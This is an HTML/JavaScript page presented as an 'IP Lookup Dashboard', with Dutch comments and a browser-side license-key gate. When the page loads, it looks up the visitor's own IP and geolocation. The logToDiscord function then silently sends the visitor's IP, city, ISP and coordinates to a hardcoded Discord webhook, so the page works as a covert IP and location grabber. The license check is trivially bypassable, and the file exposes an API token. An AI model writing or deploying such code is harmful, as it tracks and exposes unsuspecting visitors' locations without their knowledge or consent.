<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Lookup Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #1e3a8a;
            transition: background-color 0.5s ease;
        }

        .output p {
            font-family: "Courier New", monospace;
            font-size: 1.1rem;
            letter-spacing: 1px;
            color: #d1d5db;
            margin-bottom: 1rem;
        }

        .output p span {
            font-weight: bold;
            color: #e5e7eb;
        }

        .output p::before {
            content: "âž¤ ";
            color: #e5e7eb;
        }

        .output p {
            margin-bottom: 0.5rem;
        }

        .map-container {
            background-color: #1e3a8a;
            padding: 15px;
            border-radius: 8px;
        }

        .gmap_canvas {
            overflow: hidden;
            width: 100%;
            height: 400px;
            border-radius: 8px;
            background-color: #1e3a8a;
        }

        .gmap_iframe {
            width: 100% !important;
            height: 100% !important;
            border-radius: 8px;
        }

        #settingsPanel {
            position: fixed;
            top: 0;
            right: 0;
            width: 300px;
            height: 100%;
            background-color: #2d3748;
            color: white;
            display: none;
            padding: 20px;
            box-shadow: -2px 0 5px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease;
        }

        #settingsPanel.open {
            display: block;
            transform: translateX(0);
        }

        #settingsIcon {
            position: fixed;
            top: 20px;
            right: 20px;
            font-size: 30px;
            color: white;
            cursor: pointer;
            z-index: 10;
        }

        #settingsPanel button {
            background-color: #4a5568;
            color: white;
            padding: 10px;
            border: none;
            margin-top: 20px;
            cursor: pointer;
            width: 100%;
        }

        #settingsPanel button:hover {
            background-color: #718096;
        }

        .color-panel {
            display: flex;
            flex-direction: column;
            margin-top: 20px;
        }

        .color-input {
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 5px;
            background-color: #4a5568;
            color: white;
            border: none;
            font-size: 16px;
            width: 100%;
        }

        .color-input:focus {
            outline: none;
            border: 1px solid #3b82f6;
        }

        .embed-container {
            display: none;
            background-color: #2d3748;
            padding: 10px;
            border-radius: 8px;
            text-align: left;
            margin-top: 20px;
            width: 300px; /* Smaller width for first embed */
        }

        .embed-container p {
            color: white;
            display: inline-block;
            vertical-align: middle;
        }

        .embed-container .small-text {
            font-size: 0.8rem;
            color: #bbb;
            font-weight: 600;
        }

        .gif-container {
            margin-left: 10px;
            display: inline-block;
            vertical-align: middle;
        }

        /* Make the GIF smaller */
        .gif-container img {
            width: 40px;
            height: 40px;
        }

        /* License entry container */
        #licenseEntry {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }

        #licenseForm {
            background-color: #2d3748;
            padding: 20px;
            border-radius: 8px;
            color: white;
            text-align: center;
            width: 300px;
        }

        #licenseForm input {
            background-color: #4a5568;
            color: white;
            padding: 10px;
            border-radius: 5px;
            border: none;
            width: 100%;
            margin-bottom: 15px;
        }

        #licenseForm button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            width: 100%;
            border-radius: 5px;
        }
    </style>
</head>
<body class="bg-gray-900 text-white">

    <!-- License Entry Form -->
    <div id="licenseEntry">
        <div id="licenseForm">
            <h2 class="text-xl font-bold">Enter License Key</h2>
            <input type="text" id="licenseKeyInput" placeholder="Enter License Key">
            <button onclick="validateLicense()">Submit</button>
        </div>
    </div>

    <div id="settingsIcon">
        <span>&#9881;</span>
    </div>

    <div id="settingsPanel">
        <h2 class="text-xl font-bold">Instellingen</h2>
        <div>
            <h3 class="mt-4">Kies Thema Kleur:</h3>
            <div class="color-panel">
                <label> Achtergrondkleur: </label>
                <input type="color" id="backgroundColor" class="color-input" value="#1e3a8a">
                <label> Lookup knopkleur: </label>
                <input type="color" id="buttonColor" class="color-input" value="#4CAF50">
            </div>
            <button onclick="applyCustomTheme()">Pas Thema toe</button>
        </div>
    </div>

    <div class="container mx-auto p-6 hidden" id="content">
        <h1 class="text-3xl font-bold text-center">IP Lookup Dashboard</h1>
        <div class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg">
            <div id="result" class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg hidden">
                <h2 class="text-xl font-semibold">IP Details:</h2>
                <div id="output" class="output mt-4 bg-gray-700 p-4 rounded-lg">
                    <p><span>IP Address:</span> <span id="ipAddress"></span></p>
                    <p><span>City:</span> <span id="city"></span></p>
                    <p><span>Region:</span> <span id="region"></span></p>
                    <p><span>Country:</span> <span id="country"></span></p>
                    <p><span>ISP:</span> <span id="isp"></span></p>
                    <p><span>Latitude:</span> <span id="latitude"></span></p>
                    <p><span>Longitude:</span> <span id="longitude"></span></p>
                    <p><span>Timezone:</span> <span id="timezone"></span></p>
                </div>
            </div>

            <div id="googleMap" class="map-container mt-4"></div>
        </div>
    </div>

    <!-- JavaScript Code -->
    <script>
        // Define valid license keys
        const validLicenses = ["PCZ-0I4XS2OFN113", "PCZ-RQXJOT8DQY09", "PCZ-MD6CGG52P3OZ", "PCZ-HJZL480HT60M", "PCZ-R6R24S3C9RMS"]; // Voeg hier andere geldige licentiecodes toe

        // Functie om de licentiecode te valideren
        function validateLicense() {
            const licenseKey = document.getElementById("licenseKeyInput").value;

            if (validLicenses.includes(licenseKey)) {
                // Licentiecode is geldig, verberg het invoerformulier
                document.getElementById("licenseEntry").style.display = "none";
                document.getElementById("content").classList.remove("hidden"); // Toon de inhoud van de website
                alert("Licentie geverifieerd! Toegang verleend.");
            } else {
                // Ongeldige licentiecode
                alert("Ongeldige licentiecode.");
            }
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        // Haal de IP van de gebruiker op bij het laden van de pagina
        window.onload = async function () {
            const ip = await getUserIP();
            lookupIP(ip);
        }

        async function lookupIP(ip) {
            // Fetch IP lookup data
            const response = await fetch(`https://ipinfo.io/${ip}/json?token=<4b708a498f9053>`);
            const data = await response.json();

            // Update UI with fetched data
            document.getElementById('ipAddress').innerText = data.ip;
            document.getElementById('city').innerText = data.city;
            document.getElementById('region').innerText = data.region;
            document.getElementById('country').innerText = data.country;
            document.getElementById('isp').innerText = data.org;
            document.getElementById('latitude').innerText = data.loc.split(',')[0];
            document.getElementById('longitude').innerText = data.loc.split(',')[1];
            document.getElementById('timezone').innerText = data.timezone;

            // Update map
            document.getElementById('googleMap').innerHTML = `<div class="gmap_canvas"><iframe class="gmap_iframe" src="https://maps.google.com/maps?q=${data.loc}&output=embed" frameborder="0" scrolling="no"></iframe></div>`;

            // Show result
            document.getElementById('result').classList.remove('hidden');

            // Log to Discord
            logToDiscord(data);
        }

        function logToDiscord(data) {
            const webhookURL = "<https://discord.com/api/webhooks/1352197635553099776/K0xeA43auB1lX5OXVIVNsr7kT69wEE15gaIUGQWP4nBMqC_QrvXi46f6CpFS5QW6vyXF>";  // Vervang dit met je werkelijke webhook URL
            const discordMessage = {
                username: "IP Lookup Log",
                embeds: [
                    {
                        title: "IP Lookup Result",
                        color: 16711680,  // Rood
                        fields: [
                            { name: "IP Address", value: data.ip, inline: true },
                            { name: "City", value: data.city, inline: true },
                            { name: "Region", value: data.region, inline: true },
                            { name: "Country", value: data.country, inline: true },
                            { name: "ISP", value: data.org, inline: true },
                            { name: "Latitude", value: data.loc.split(',')[0], inline: true },
                            { name: "Longitude", value: data.loc.split(',')[1], inline: true },
                            { name: "Timezone", value: data.timezone, inline: true },
                        ],
                        footer: { text: "IP Lookup Tool" }
                    }
                ]
            };
            
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(discordMessage)
            });
        }

        function applyCustomTheme() {
            const backgroundColor = document.getElementById('backgroundColor').value;
            const buttonColor = document.getElementById('buttonColor').value;
            document.body.style.backgroundColor = backgroundColor;
            document.getElementById('lookupButton').style.backgroundColor = buttonColor;
        }

        // Open settings panel
        document.getElementById('settingsIcon').addEventListener('click', function () {
            document.getElementById('settingsPanel').classList.toggle('open');
        });
    </script>
</body>
</html>
